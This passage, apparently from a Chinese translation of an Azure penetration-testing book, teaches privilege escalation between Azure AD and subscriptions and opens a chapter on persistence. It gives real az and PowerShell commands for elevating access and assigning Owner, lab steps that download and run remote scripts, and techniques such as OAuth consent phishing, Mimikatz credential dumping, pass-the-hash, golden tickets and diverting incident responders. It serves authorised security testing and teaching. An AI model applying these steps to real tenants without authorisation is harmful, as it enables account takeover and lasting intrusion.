  \ Azure AD 应用程序、哪些用户帐户或应用程序是容易的目标，以及如何规避防御配置的信息！\n\n在我们的案例中，我们可以通过门户登录或使用 Azure\
  \ PowerShell 查看日志，以查看有权访问 Azure 资源的<|message|>。我们随后可以将该信息与用户的组成员身份相关联。\n\n要使用 Azure\
  \ PowerShell 查看登录日志，我们首先需要安装 AzureAD 预览版 PowerShell 模块。在撰写本文时，此功能仅在模块的预览版中可用。某些预览功能永远不会进入正式发布版本，因此此功能*可能*将来不会正式发布。\n\
  \n请注意，此模块不能与 **正式发布版 (GA)** 的 AzureAD 模块并行安装，因此如果已安装，我们可能首先需要删除 GA 版本。假设您一直在按照示例操作，AzureADPreview\
  \ 应该已作为设置 PowerZure 的一部分安装。\n\n如果模块尚未设置，您可以使用以下说明进行操作：\n\n```\n#### Remove the GA\
  \ version if it is installed\nUninstall-Module AzureAD\n#### Install the preview\
  \ version of the AzureAD module. Close and re-open the PowerShell console afterwards\n\
  Install-Module AzureADPreview\n#### Verify that the GA version of the module is\
  \ installed\n```\n\n```\nImport-Module AzureADPreview\nGet-Module AzureADPreview\
  \ | select Name,Version\nName        Version\n----        -------\nAzureADPreview\
  \ 2.0.2.138\n```\n\n要查看有趣事件的登录日志，我们可以使用 Get-AzureADAuditSignInLogs cmdlet，如以下命令所示（此命令需要原生工作/学校\
  \ Azure AD 用户帐户，而不是 Microsoft 帐户）。以下命令将筛选登录日志，以在指定时间范围内成功登录 Azure 门户或 Azure PowerShell（日期可以修改为当前日期之前的日期，以获取过去\
  \ 24 小时的结果）。这些命令的输出提供了非常有用的信息，我们可以用来验证 Azure 管理工具的用户，这通常意味着他们对 Azure 资源具有某种级别的访问权限：\n\
  \n```\n#### First connect to Azure AD\nConnect-AzureAD\n#### Get successful Azure\
  \ Portal sign-ins in the time range (greater than the specified date)\nGet-AzureADAuditSignInLogs\
  \ -Filter \"appDisplayName eq 'Azure Portal' and createdDateTime gt $((Get-Date).AddDays(-1).ToString('yyyy-MM-dd'))\
  \ and status/errorCode eq 0\"\n#### Get successful Azure PowerShell sign-ins in\
  \ the time range (greater than the specified date)\nGet-AzureADAuditSignInLogs -Filter\
  \ \"appDisplayName eq 'Microsoft Azure PowerShell' and createdDateTime gt $((Get-Date).AddDays(-1).ToString('yyyy-MM-dd'))\
  \ and status/errorCode eq 0\"\n```\n\n我们可以进一步筛选以获取有助于显示用户帐户安全配置的属性。此信息在需要绕过防御时可能很有用：\n\
  \n```\n#### Get interesting authentication properties for successful Azure Portal\
  \ sign-ins\nGet-AzureADAuditSignInLogs -Filter \"appDisplayName eq 'Azure Portal'\
  \ and createdDateTime gt $((Get-Date).AddDays(-1).ToString('yyyy-MM-dd')) and status/errorCode\
  \ eq 0\" | Select-Object UserPrincipalName, MfaDetail, AppliedConditionalAccessPolicies\n\
  ```\n\n以下是此命令的示例输出：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_278_0.png)\n\n图\
  \ 7.3 – 登录审计的 PowerShell 命令结果\n\n以下 Azure AD 内置角色具有读取此信息所需的权限：安全管理员、安全阅读器和报告阅读器。此外，任何具有以下权限的自定义\
  \ Azure AD 角色也可能被使用：\n\n- microsoft.directory/groups/allProperties/allTasks - 授予在\
  \ Azure AD 中读取和更新组属性的权限\n- microsoft.directory/signInReports/allProperties/read\
  \ - 授予读取登录报告的权限\n\n还值得注意的是，如果您的渗透测试范围涵盖了该情况，则存在从 Azure AD 横向移动到其他可能使用 Azure AD 作为其身份提供者的云应用程序的机会。您可以通过查看\
  \ Azure AD 中的企业应用程序来发现与其他 Azure AD 存在信任关系的其他应用程序。您可以使用此部分查找获授权访问应用程序的用户以及他们所属的组。如果访问是通过组授予的，您可以加入这些组以获得对这些云应用程序的权限。\n\
  \n#### 路径 2 – 重置用户密码\n\n另一种可能被利用以横向移动到另一个 Azure 订阅的路径是重置具有另一个 Azure 订阅权限的用户密码并以该用户身份登录。此路径不太受青睐，因为它会影响用户的现有访问权限且更具侵入性。如果用户突然无法使用一直使用的密码登录其帐户，很容易引起警报，并且审计日志会反映最近的密码更改事件。\n\
  \n除了全局管理员角色外，以下 Azure AD 角色具有重置用户密码的权限：密码管理员、服务台管理员、身份验证管理员、用户管理员和特权身份验证管理员。特权身份验证管理员角色具有不受限制的重置密码权限，但其他列出的角色仅对权限少于其角色本身的用户具有有限的重置密码权限。Microsoft\
  \ 已详细说明了所有具有密码重置权限的 Azure AD 角色，以及他们可以为哪些用户重置密码，网址为 https://docs.microsoft.com/en-us/azure/active-directory/roles/permissions-reference#password-reset-permissions。\n\
  \n对于此路径需要考虑的另一点是可能为帐户配置的额外安全保护。例如，您可能希望查看登录日志以确定用户帐户是否需要使用 MFA，或者先前的登录事件是否应用了其他登录条件。\n\
  \n#### 路径 3 – 利用服务主体密钥\n\n另一种可用于从 Azure AD 横向移动到 Azure 资源的方法是通过利用具有 Azure 资源权限的现有服务主体。它在组织中很常见，服务主体具有特权角色分配，例如订阅级别的参与者。事实上，这是自动在\
  \ Azure DevOps 中创建的服务主体默认授予的角色分配！我们在第 4 章《滥用 Reader 权限》中利用了相同的场景，以从 Reader 角色提升权限。图\
  \ 7.4 显示了此攻击的工作方式：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_279_0.png)\n\n图 7.4\
  \ – Azure AD 服务主体到订阅的关系\n\n\n它为我们提供了以下信息：\n\n+   1. **User3** 最初对 Azure 资源没有访问权限，但拥有更新服务主体凭据的权限。\n\
  +   2. **App-1** 的服务主体被分配了 Azure 资源的参与者角色。\n+   3. **User3** 获取 **App-1** 的应用 ID，并利用该权限向\
  \ **App-1** 添加新的客户端机密。\n+   4. **User3** 使用应用 ID 和新添加的密钥获得对 Azure 资源的访问权限。\n\n>\
  \ **重要说明**\n> 本章的讨论集中在 Azure AD 中的“全局管理员”角色上，但 Azure AD 中还有其他一些内置角色可用于执行此攻击，包括：**应用程序管理员**、**云应用程序管理员**、**目录同步账户**和**混合身份管理员**。此外，任何具有以下权限的\
  \ Azure AD 自定义角色都可能被利用：`microsoft.directory/servicePrincipals/credentials/update`。\n\
  \n此路径比重置用户密码的路径更受青睐，因为它侵入性较小。它不会影响使用服务主体的应用程序的任何现有访问权限，只是为攻击者增加了一种额外的访问方式。要识别具有\
  \ Azure 资源访问权限的服务主体，我们可以查看登录日志中的非交互式登录活动。此外，服务主体通常以其所使用的应用程序和/或订阅命名，因此其名称可能是一个很好的线索。\n\
  \n#### 路径 4 – 提升对根管理组的访问权限\n\n从 Azure AD 横向移动到 Azure 资源的另一条路径是提升对根管理组的访问权限。此选项是为了让全局管理员在所有者失去访问权限时重新获得对订阅的访问权限而存在的，但它也可能被攻击者利用。\n\
  \n提升操作隐式授予 **用户访问管理员** 角色对租户中所有订阅和管理组的访问权限，从而拥有向 Azure 资源分配角色的不受限制的权限（*图 7.5*）。利用此漏洞的攻击者可以查看所有资源，并在租户中的任何订阅或管理组中分配访问权限！\n\
  \n```\n{\n  \"properties\": {\n    \"roleName\": \"\",\n    \"description\": \"\"\
  ,\n    \"assignableScopes\": [\n      \"/subscriptions/204cce89-27de-4669-a48b-04c27255e05e\"\
  \n    ],\n    \"permissions\": [\n      {\n        \"actions\": [\n          \"\
  */read\",\n          \"Microsoft.Authorization/*\",\n          \"Microsoft.Support/*\"\
  \n        ],\n        \"notActions\": [],\n        \"dataActions\": [],\n      \
  \  \"notDataActions\": []\n      }\n    ]\n  }\n}\n```\n\n用户访问管理员角色对 Microsoft.Authorization\
  \ 具有完全访问权限。\n\n图 7.5 – 用户访问管理员角色定义\n\n可以通过 Azure 门户中 Azure AD 的属性部分完成提升（图 7.6）：\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_281_0.png)\n\n图 7.6 – 修改对租户中所有订阅的访问权限\n\
  \n也可以通过 Azure CLI 以编程方式完成提升。相关命令如下：\n\n```\naz rest --method post --url \"/providers/Microsoft.Authorization/elevateAccess?api-version=2016-07-01\"\
  \n```\n\n> **重要说明**\n> 微软提供了关于此功能在 Azure AD 中如何工作的出色文档。请参阅以下 URL 以获取更多信息：https://docs.microsoft.com/en-us/azure/role-based-access-control/elevate-access-global-admin#how-does-elevated-access-work。\n\
  \n现在我们已经了解了如何提升权限，接下来看一个实际示例。\n\n#### 动手实验 – 准备全局管理员/所有者利用场景\n\n本动手实验将为我们完成本章其余实验做好准备。要跟随本章将介绍的场景进行操作，你需要先在\
  \ Azure AD 租户中设置一个具有全局管理员权限的用户，再在 Azure 订阅中设置一个具有所有者权限角色的用户。我们使用一个可以通过 Azure Cloud\
  \ Shell 运行的 PowerShell 脚本自动完成了此设置。以下是本实验要完成的任务：\n\n+   1. 打开 Web 浏览器并访问 Azure 门户（https://portal.azure.com）。使用\
  \ azureadmin 凭据登录。\n+   2. 在 Azure 门户中，点击右上角的 Cloud Shell 图标。选择 PowerShell：\n+ \
  \  3. 在 Cloud Shell 窗格中的 PowerShell 会话中，运行以下命令，以下载一个脚本，用于创建具有所有者权限的用户账户、一个具有全局管理员权限的用户，并设置所需的易受攻击工作负载：\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_282_0.png)\n\n图 7.7 – 点击图标以打开 Cloud Shell\n\
  \n```\nPS C:\\> Invoke-WebRequest https://bit.ly/owner-scenarios -O owner-scenarios.ps1\n\
  PS C:\\> Get-ChildItem\n```\n\n以下是操作截图的示例：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_283_0.png)\n\
  \n图 7.8 – 下载 Owner 场景脚本\n\n4. 运行下载的脚本，以预配本章练习所需的对象和资源，使用以下命令：\n\n```\nPS C:\\> ./owner-scenarios.ps1\n\
  ```\n\n当提示输入密码时，输入 myPassword123 并按 Enter。等待脚本部署完成。这可能需要大约 8 分钟：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_283_1.png)\n\
  \n图 7.9 – 运行 Owner 场景脚本\n\n#### 这个脚本做什么？\n\n该脚本会在 Azure AD 中创建一个具有全局管理员权限的用户账户，并在\
  \ Azure 订阅中创建另一个具有所有者权限的用户。请参见图 7.10 的示意图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_284_0.png)\n\
  \n图 7.10 – 全局管理员/所有者利用场景\n\n5. 脚本完成后，本练习其余部分所需的关键信息将显示在输出部分。请将这些信息复制到记事本文档中，以备后用。你需要从输出部分获取四个值：\n\
  \nAzure Global Admin User：这是具有 Azure AD 全局管理员权限的管理员用户名。\n\n**Azure Global Admin\
  \ User Password：** 这是全局管理员用户的密码。\n\n**Azure Owner User：** 这是对 Azure 资源具有所有者权限的管理员用户名。\n\
  \n**Azure Owner User Password：** 这是 Azure 资源所有者用户的密码。\n\n相关信息可以在以下截图中看到：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_285_0.png)\n\
  \n图 7.11 – 获取脚本输出\n\n现在，你已经成功创建了将在本章后续练习中使用的资源。在下一个动手实验中，我们将介绍如何利用提升访问权限选项，从 Azure\
  \ AD 横向移动到 Azure 资源。\n\n#### 动手实验 – 提升访问权限\n\n以下是本实验要完成的任务：\n\n+   - **任务 1：** 验证当前用户的访问权限。\n\
  +   - **任务 2：** 使用 Azure CLI 提升访问权限。\n+   - **任务 3：** 验证对 Azure 资源的访问权限。\n\n让我们逐步完成这些任务：\n\
  \n+   1. 在你的 Pentest VM 上打开 **PowerShell**。\n+   2. 在 **PowerShell** 控制台中，输入 `bash`\
  \ 切换到 **Windows Subsystem for Linux**。\n+   3. 使用以下命令切换到 root 用户。当提示时，输入管理员密码：\n\
  \n```\nazureuser@PentestVM:~# sudo su -\n```\n\n4. 使用 Azure CLI 命令 – az login 向\
  \ Azure 进行身份验证：\n\n```\nroot@PentestVM:~# az login\n```\n\n以下是一个截图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_286_0.png)\n\
  \n图 7.12 – az login 的结果\n\n5. 当提示时，输入你在本章第一个练习中从脚本输出获取的 Azure 全局管理员凭据：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_286_1.png)\n\
  \n图 7.13 – Azure 密码提示\n\n你将收到一条关于无法访问订阅的输出消息。这是因为该账户仅有权访问 Azure AD，而无法访问任何 Azure\
  \ 订阅：\n\n\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_287_0.png)\n\n图7.14 – AZ CLI登录结果\n\
  \n6. 运行以下命令以获取租户级访问权限。当提示时，使用之前使用的同一全局管理员用户进行身份验证：\n\n```\naz login --allow-no-subscriptions\n\
  ```\n\n这次你会收到一条关于成功登录的消息。以下是输出截图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_287_1.png)\n\
  \n图7.15 – 作为全局管理员成功登录\n\n7. 运行以下命令，利用全局管理员角色修改对Azure资源的权限：\n\n```\naz rest --method\
  \ post --url \"/providers/Microsoft.Authorization/elevateAccess?api-version=2016-07-01\"\
  \n```\n\n如果没有收到任何输出，则表示命令已成功执行。\n\n8. 注销，然后使用全局管理员凭据重新登录，以确认你现在对Azure订阅资源拥有权限：\n\
  \n```\naz logout\n```\n\n```\naz login\n```\n\n以下是相关截图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_288_0.png)\n\
  \n图7.16 – 具有订阅访问权限的AZ CLI登录\n\n9. 使用以下命令将订阅所有者角色分配给全局管理员账户：\n\n```\nuserPrincipalName=$(az\
  \ ad signed-in-user show --query userPrincipalName -o tsv)\n```\n\n```\naz role\
  \ assignment create --role \"Owner\" --assignee $userPrincipalName\n```\n\n命令将成功执行，证明你已经使用提升后的全局管理员角色修改了Azure资源的权限！以下是命令的输出：\n\
  \n```\nroot@PentestVM:~#\nroot@PentestVM:~# userPrincipalName=$(az ad signed-in-user\
  \ show --query userPrincipalName -o tsv)\nroot@PentestVM:~# az role assignment create\
  \ --role \"Owner\" --assignee $userPrincipalName\n{\n  \"canDelegate\": null,\n\
  \  \"condition\": null,\n  \"conditionVersion\": null,\n  \"description\": null,\n\
  \  \"id\": \"/subscriptions/204cce89-.../providers/Microsoft.Authorization/roleAssignments/5ac7db39-887b-40c6-a743-e562f2120a6a\"\
  ,\n  \"name\": \"5ac7db39-887b-40c6-a743-e562f2120a6a\",\n```\n\n图7.17 – 分配所有者角色\n\
  \n现在，我们已经从Azure AD修改了自身对Azure订阅的权限。让我们探讨相反的场景以及可用于实现这一目标的技术。\n\n#### 从订阅所有者提升到Azure\
  \ AD角色\n\n在渗透测试中，你可能还希望从Azure订阅横向移动到Azure AD。这一目标可能是攻击链的一部分，其目的是在Azure AD中打开后门以实现持久化。我们将在第8章“在Azure环境中实现持久化”中讨论持久化主题。以下是可用于实现此目标的一些技术。\n\
  \n#### 路径1 – 利用特权服务主体\n\n与用户账户类似，服务主体和托管标识也可以被分配到Azure AD角色。许多攻击者认为服务主体和托管标识是更容易的目标，因为它们通常被排除在条件访问和MFA等安全策略之外。\n\
  \n攻击者可以利用具有服务主体或托管标识权限的Azure AD账户的特权，访问安全特权主体。这是一条可能路径，但你可能很少遇到，尤其是当组织严格遵守不同作用域分离角色分配的原则时。\n\
  \n#### 路径2 – 利用服务主体的API权限\n\nMicrosoft标识平台支持两种类型的服务主体权限：委托权限和应用权限。委托权限用于交互式身份验证流程，其中存在已登录用户。在这种情况下，用户需要在访问时同意权限（或者管理员可以代表用户同意）。\n\
  \n应用权限用于在没有任何用户交互的情况下运行的应用程序，这意味着没有用户登录到这些应用。管理员只需为应用同意一次授予的权限。服务主体被授予对API（如Microsoft\
  \ Graph）执行敏感操作的权限并不罕见。攻击者可以利用这些权限访问应用已被授予访问权限的API。\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_290_0.png)\n\
  \n图7.18 – 服务主体应用权限\n\n例如，一个应用可能在Azure AD中没有任何角色分配，但如果它具有在Microsoft Graph中执行敏感操作的应用权限，这就可以作为访问Azure\
  \ AD的间接方式。这种攻击方式也正成为攻击者常用的网络钓鱼技术。通过使用Azure AD同意授权URL（图7.19），攻击者可以使用合法的Azure URL发送给网络钓鱼受害者。此URL使用Azure\
  \ AD内置的权限批准流程，允许用户批准外部应用程序。\n\n#### 请求的权限\n\nOAuth令牌攻击\n\n此应用程序不是由Microsoft发布的。\n\
  \n此应用希望：\n\n- 让你登录并读取你的个人资料\n- 保留你对已授权数据的访问权限\n- 读取你的邮件\n\n接受这些权限意味着你允许此应用按照其服务条款和隐私声明使用你的数据。你可以在\
  \ https://myapps.microsoft.com 更改这些权限。显示详细信息\n\n此应用看起来可疑吗？请在此处举报\n\n图7.19 – OAuth网络钓鱼攻击示例\n\
  \n从与所有者相关的Azure AD提升场景继续，我们现在将重点介绍利用本地网络的提升技术。\n\n#### 攻击本地系统以在Azure中提升权限\n\n虽然这似乎偏离了攻击Azure服务，但许多租户与其同步的Active\
  \ Directory环境存在直接连接。通过利用这些连接攻击本地系统，攻击者可能能够提升其在主Active Directory环境中的权限。提升到域管理员权限将使攻击者能够访问域中特权用户的账户，包括那些具有Azure\
  \ AD权限的用户。\n\n由于在内部环境中提升权限的方法有很多，我们将重点介绍一些通用概念，这些概念将用于从Azure横向移动到本地系统。\n\n#### 识别与本地网络的连接\n\
  \n首先，我们将了解如何识别连接云与本地网络的连接。这些连接可以让我们横向移动到其他网络，从而可能在一般Active Directory环境中进行权限提升。\n\
  \n> **重要说明**\n> \n> 由于此场景的实验室需要你设置到另一个网络的连接，我们不会在动手练习中介绍此内容。但我们会提供如何查找这些连接的说明。\n\
  \n在Azure门户中，查找本地连接是一项简单的任务。只需导航到“连接”边栏选项卡，即可看到可用连接列表。这些连接可以是“站点到站点VPN”或“Express\
  \ Route”连接。\n\n#### 站点到站点（IPsec）连接\n\n站点到站点连接依靠传统网络硬件（VPN集中器、路由器等）创建从Azure到另一个网络的VPN隧道。许多组织选择此选项，因为它允许他们与现有技术集成。站点到站点的主要区别之一是流量通过公共互联网传输，而不是私有骨干连接。\n\
  \n#### Express Route连接\n\n对于那些希望从其网络到Azure拥有更专用（且私有）连接的用户，Express Route连接是首选选项。这些连接通常通过Microsoft有合作关系的服务提供商为组织创建。\n\
  \n虽然了解这些连接的工作原理很重要，但我们真正关心的是如何利用这些连接攻击其他网络。由于创建这些连接需要使用虚拟网关，我们需要检查网关设置，以确定哪些网络可以访问远程连接。\n\
  \n\n\n\n\n一般来说，如果我们在订阅上拥有 Contributor（或 Owner）角色，我们应该能够访问具有连接访问权限的虚拟网络中的虚拟机资源。最坏的情况下，我们始终可以在适当的虚拟网络中创建一个新的\
  \ VM，或将网络接口附加到现有 VM。\n\n在获得对本地网络的访问权限以及一些域凭据后，我们将希望找到在域中提升权限的任何可用选项。我们将在以下章节中介绍一些常见的选项和工具。\n\
  \n#### 识别域提升路径\n\n由于我们假设已提升到 Owner 角色，或提升到具有多个订阅访问权限的帐户，我们将假设在某个阶段收集到了一些域凭据。如果没有，我们建议重新审视前几章，以回顾我们如何从虚拟机和\
  \ PaaS 服务中提取域凭据的方法。\n\n使用这些获取的域凭据，我们将希望使用工具来识别 Active Directory 域中可用于提升权限的资源。在许多环境中，需要在系统之间进行多次跳转才能获得域管理员权限。\n\
  \n作为示例，以下是与 Azure 资源集成的 Active Directory 域（ACME.local）的常见域提升路径：\n\n- 攻击者从 Active\
  \ Directory 或 Azure VM 中收集域凭据（密码猜测、网络协议攻击等）。\n- 攻击者使用凭据获取可在 Kerberoasting 攻击中破解格式的\
  \ Kerberos 票据。\n- 票据被破解，揭示了相关服务帐户（ACME\\SQLUser1）的明文凭据。\n- 该服务帐户在 AD 服务器计算机组上具有本地管理员权限。\n\
  - 该组中的一台服务器（FileServer01）对域管理员帐户 ACME\\kfosaen-DA 存在活动登录会话。\n- 攻击者使用 SQLUser1 服务帐户凭据以本地管理员身份登录\
  \ FileServer01 服务器，并使用 Mimikatz 从 LSASS 进程中转储域管理员凭据。\n\n截至撰写本文时，这是在 Active Directory\
  \ 域中可用的常见提升路径。这是一条可以通过收集一些基本域信息（服务主体、域组等）手动识别的路径，但也有工具可帮助自动化这些路径的识别。我们将在下一节中介绍其中一些工具，以及有助于在系统之间进行枢转的其他工具。\n\
  \n#### 自动化提升路径的识别\n\nBloodHound 工具的创建是为了帮助简化 Active Directory 提升路径的识别。该工具允许域用户收集有关域中活动主机和用户会话的关键信息，以帮助将权限串联成图。然后可以解析该图以找到到达所需权限的最直接路径：\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_294_0.png)\n\n图 7.20 – 示例 BloodHound\
  \ 图\n\n使用我们之前的示例，攻击者可以收集域数据，并通过使用 BloodHound 轻松找到从 Kerberoasting 攻击到域管理员权限的路径。\n\
  \n##### BloodHound 信息\n\n**创建者：** Andrew Robbins（Twitter：@wald0）、Rohan Vazarkar（Twitter：@CptJesus）和\
  \ Will Schroeder（Twitter：@harmj0y）\n\n**开源或商业：** 开源项目；提供商业选项\n\n**GitHub 仓库：** `https://github.com/BloodHoundAD/BloodHound`\n\
  \n**语言：** PowerShell, JavaScript\n\n得益于工具的最新更新，BloodHound 还支持查找本章中提到的许多 Azure 攻击路径。能够绘制\
  \ Azure 角色和资源关系图对于识别在 Azure 中横向移动和提升权限的方法非常有帮助。虽然我们不会介绍该工具的完整使用方法，但它是攻击 Active Directory\
  \ 的最强大工具之一，强烈推荐用于 Active Directory 测试。\n\n**重要说明**\n\n由于为 BloodHound 收集 Azure 数据而搭建实验室需要订阅中的一些专用资源分配，因此我们选择省略该工具的实验。如果你想查看它收集的一些数据，请随时运行前几章中的任何构建脚本，运行\
  \ AzureHound 收集工具，然后将数据导入 BloodHound。\n\n虽然这超出了本书的范围，但有大量工具可用于单独收集与 BloodHound 收集的信息类似的片段。如果操作得当，在渗透测试期间，这种分片收集域信息可能比\
  \ BloodHound 收集方法更不明显，但它需要对数据进行更多手动解释（以及对攻击路径的特定知识）才能识别出 BloodHound 找到的相同路径。\n\n\
  #### 用于沿提升路径枢转的工具\n\n在明确了在本地环境中枢转的路径后，我们需要一些工具来帮助我们自动化此过程，使工作更轻松。值得庆幸的是，许多常见的提升操作可以从非域加入的系统完成，无需自定义工具。然而，在评估期间保持低调的最佳方法之一是通过使用原生系统管理工具（RDP、PS\
  \ Remoting 等）*脱离 LAN* 运行。\n\n由于原生 Windows 工具没有内在支持凭据收集和进程迁移等功能，因此可能需要额外的工具来完成我们的目标。由于这些工具各自都可能有一本专著，我们只在此简要介绍其中一些，并留给读者自行学习这些工具：\n\
  \n- Metasploit\n- CrackMapExec\n- Cobalt Strike\n- Empire\n- Red Team Toolkit\n\
  - Covenant\n\n这些工具都可用于域中的横向移动和提升。虽然工具并不总是必需，但它们可以帮助简化一些工作。\n\n虽然这始终会受到环境中可用路径的影响，但在提升期间我们在域环境中在系统之间枢转时，通常会使用以下方法：\n\
  \n- 获取域或本地凭据。\n- 使用凭据或漏洞利用获得对系统的本地管理员访问权限。\n- 攻破系统上可用的凭据。\n- 识别可枢转到的额外目标。\n- 横向移动到额外目标，并重新开始循环。\n\
  \n一旦在上述过程中收集到域管理员凭据，我们就进入新阶段，在该阶段中我们收集特权 Azure 用户的凭据并使用它们枢转到 Azure 租户。\n\n接下来，我们将介绍在域内提升后该怎么做。\n\
  \n#### 域提升和横向移动后的通用提示\n\n域管理员权限不应是内部网络渗透测试的终点。在域管理员处停止，你只是表明你完全控制了域，但没有展示这些权限的潜在影响。在内部渗透测试中，攻击者可以利用这些特权访问敏感数据存储，并强调攻击者提升权限的潜在危险。\n\
  \n同样的原理也适用于 Azure 渗透测试。获得域管理员权限实际上应该只是我们作为特权用户重新进入 Azure AD 环境的立足点。由于 Azure AD 环境与主\
  \ Active Directory 环境紧密相连，因此有许多获取对 Active Directory 帐户控制的方法，从而使我们能够枢转到 Azure。\n\n\
  获得域管理员权限后的第一步应该是从域控制器收集域 NTLM 哈希。这将为我们带来以下机会：\n\n- 破解收集到的哈希以获得明文凭据\n- 使用密码哈希进行 **Pass-the-Hash\
  \ (PtH)** 攻击\n- 使用域 `krbtgt` 帐户哈希通过黄金票据攻击在域中保持持久性\n\n由于转储所有域哈希可能会有点嘈杂，你可能希望针对特定帐户（krbtgt、域/全局管理员等）进行哈希转储。此外，负责你的域的人员可能不希望重置每个域密码，因此在转储域哈希时做出合理的选择。\n\
  \n为了演示的目的，让我们假设我们已经收集了 Azure 租户中 Global Administrator 帐户的所有域 NTLM 哈希。如果我们能够破解其中任何一个哈希，我们可能能够使用明文凭据以特权角色枢转到\
  \ Azure 租户。\n\n你可能会认为所有这些特权帐户都受 MFA 和条件访问策略保护。这并不总是如此。虽然强制所有帐户使用 MFA 变得越来越普遍，但作者经常遇到用户被分配特权\
  \ Azure AD 角色，但从未为该帐户配置 MFA 的情况。你的情况可能有所不同，但值得一试。\n\n或者，我们可以使用收集到的域凭据（明文或哈希）用于特权用户，以访问\
  \ Azure 管理员使用的系统。如前所述，Azure 令牌可以存储在用户工作站的 `.Azure` 配置文件文件夹中。通过使用其中一个被攻破的特权帐户访问工作站，我们可能能够冒充\
  \ Azure 管理员用户的令牌。我们将在下一章深入介绍此过程，作为在环境中获得持久性的方法。\n\n最后，在拥有管理员权限的情况下，我们可能可以控制用于 Azure\
  \ 环境的 MFA 系统。如果使用第三方（Okta、Duo 等）MFA 系统，特权域用户可能可以控制其他用户的令牌。通过破解 Global Administrator\
  \ 的密码并为其授予新的 MFA 令牌（在你的设备上），你可能能够接管其 Azure 帐户。\n\n\n\n\n既然我们已经审查了使用本地资源进行权限提升的选项，现在让我们清理本章中为这些场景创建的资源。\n\
  \n#### 动手练习 – 清理所有者权限利用场景\n\n在这个最后的练习中，我们将使用一个清理脚本来自动删除本章中为这些场景设置的资源。以下是我们将在本练习中完成的任务：\n\
  \n- 从 GitHub 下载清理脚本。\n- 运行脚本以删除为这些场景创建的对象和资源。\n\n以下是完成这些任务所需的步骤：\n\n- 1. 打开 Web\
  \ 浏览器并浏览到 Azure 门户 (https://portal.azure.com)。使用 azureadmin 凭据登录。\n- 2. 在 Azure\
  \ 门户中，单击 Azure 门户右上角的 Cloud Shell 图标。选择 PowerShell：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_298_0.png)\n\
  \n3. 在 Cloud Shell 窗格中的 PowerShell 会话中，运行以下命令下载一个脚本，以清理本章中构建的场景。同时验证下载是否成功：\n\n\
  ```\nPS C:\\> Invoke-WebRequest https://bit.ly/owner-scenario-cleanup -O owner-scenario-cleanup.ps1\n\
  PS C:\\> Get-ChildItem\n```\n\n以下是它的截图：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_299_0.png)\n\
  \n图 7.22 – 下载脚本的结果\n\n- 4. 运行已下载的脚本，使用以下命令删除为本练习创建的对象和资源：\n\n```\nPS C:\\> ./owner-scenario-cleanup.ps1\n\
  ```\n\n等待脚本执行完成。这大约需要 8 分钟：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_299_1.png)\n\
  \n图 7.23 – 运行清理脚本的结果\n\n恭喜！您已经完成了本章中的所有练习场景，并成功地从您的订阅中删除了所设置的资源。\n\n#### 摘要\n\n\
  在本章中，我们回顾了攻击者可能利用订阅所有者角色，在租户中提升到 Azure AD 特权角色的多种方式。我们还回顾了攻击者如何利用 Azure AD 访问权限来获得租户内订阅的权利。虽然在\
  \ Azure 渗透测试中并非总是需要这样做，但在订阅和 Azure AD 之间进行横向移动可以是在环境中展示权限提升全面影响的最佳方式之一。\n\n在下一章（也是最后一章）中，我们将展示如何利用这种访问权限在\
  \ Azure 租户的各个级别为自己创造持久化机会。从虚拟机一直到 Azure AD，我们将回顾在 Azure 租户中持久化访问的可用选项。\n\n#### 在\
  \ Azure 环境中实现持久化\n\n在最后一章中，我们将介绍攻击者在 Azure 环境中持久化访问的不同方式。持久化访问可以在 Azure 租户的多个级别建立，它能让你在长期参与期间持续访问敏感资源。此外，本章对于试图识别或阻止攻击者访问\
  \ Azure 环境的人来说，也应该是一个很好的参考资料。\n\n在本章中，我们将涵盖以下主要主题：\n\n- 理解持久化的目标\n- 在 Azure 订阅中实现持久化\n\
  - 在 Azure AD 租户中实现持久化\n\n##### 理解持久化的目标\n\n持久化是一个相当简单的概念。一般来说，我们希望保持对环境的访问，以便能够抵御任何主动移除我们对环境访问的企图。虽然可以用一整章来专门论述与持久化相关的概念性想法，但我们这里没有篇幅这样做。相反，我们将提供一些关于持久化的通用指南，供你在本章中思考。然后，我们将把这些想法应用到\
  \ Azure 环境的不同领域。\n\n#### 做好被发现的心理准备\n\n在任何你想在环境中持久化的场景下，你都应该假设你的存在会被注意到，并且你的访问权限会被移除。你的初始访问途径应始终被视为\
  \ *短期资源*，它们能让你建立额外的持久化选项。虽然你可能可以通过这些初始途径维持访问，但它们很可能是最先暴露的。\n\n#### 准备多个通道\n\n通过为环境保留多个访问选项，你不仅为自己提供了恢复被移除访问的选项，还拥有了多个通道，可以混淆对环境中进行事件响应的任何人。通过使用你愿意舍弃的通道制造更大的动静，可能更容易将你的一些活动隐藏在另一个账户或服务中。\n\
  \n让我们看一些示例：\n\n- 使用 Azure AD 用户通过“运行命令”功能直接执行 VM 命令。这是一种相当明显的操作，很容易追踪到单个用户。\n- 通过自动化帐户\
  \ Runbook 使用“运行命令”功能并以“运行方式帐户”间接执行 VM 命令。这会被“运行方式帐户”掩盖，因此可能不太明显。\n\n同时拥有这两种命令执行选项，可以让你在租户中通过其他有效操作来掩盖你的活动。其中任一选项也可能是一个明显的信号，可以用来转移事件响应团队的注意力，同时你完成其他操作。\n\
  \n#### 使用长期和短期通道\n\n通过使用长期持久化通道来创建或恢复对短期通道的访问，你可以在需要时舍弃短期资源。长期持久化方法应具有特权（订阅所有者、AAD\
  \ 租户权限等），并允许你创建新资源或向租户分配新权利。这些才是真正能帮助你保持或恢复对租户整体访问的持久化方法。长期通道还应谨慎使用，因为它们对持久化至关重要。它们使用得越少，产生的噪音就越少。\n\
